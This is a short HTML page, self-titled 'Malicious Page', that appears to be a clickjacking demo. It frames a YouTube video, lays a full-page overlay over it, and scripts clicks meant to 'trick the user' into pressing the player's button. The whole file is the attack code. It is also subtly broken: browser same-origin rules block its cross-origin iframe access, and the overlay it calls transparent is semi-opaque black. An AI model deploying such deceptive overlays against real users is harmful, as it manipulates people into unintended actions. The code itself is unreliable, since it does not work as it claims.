<!DOCTYPE html>
<html>
<head>
  <title>Malicious Page</title>
</head>
<body>
  <iframe src="https://www.youtube.com/watch?v=dQw4w9WgXcQ" frameborder="0" width="100%" height="100%"></iframe>
  <style>
    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 1;
    }
  </style>
  <script>
    // Add a transparent overlay to trick the user into clicking the skip button
    var overlay = document.createElement("div");
    overlay.style.position = "absolute";
    overlay.style.top = "0";
    overlay.style.left = "0";
    overlay.style.width = "100%";
    overlay.style.height = "100%";
    overlay.style.zIndex = "2";
    overlay.style.background = "rgba(0, 0, 0, 0.5)";
    document.body.appendChild(overlay);

    // Add a click event listener to the overlay
    overlay.addEventListener("click", function(event) {
      // Get the skip button element
      var skipButton = document.querySelector("iframe").contentDocument.querySelector(".ytp-play-button.ytp-button");
      // Simulate a click on the skip button
      skipButton.click();
    });
  </script>
</body>
</html>
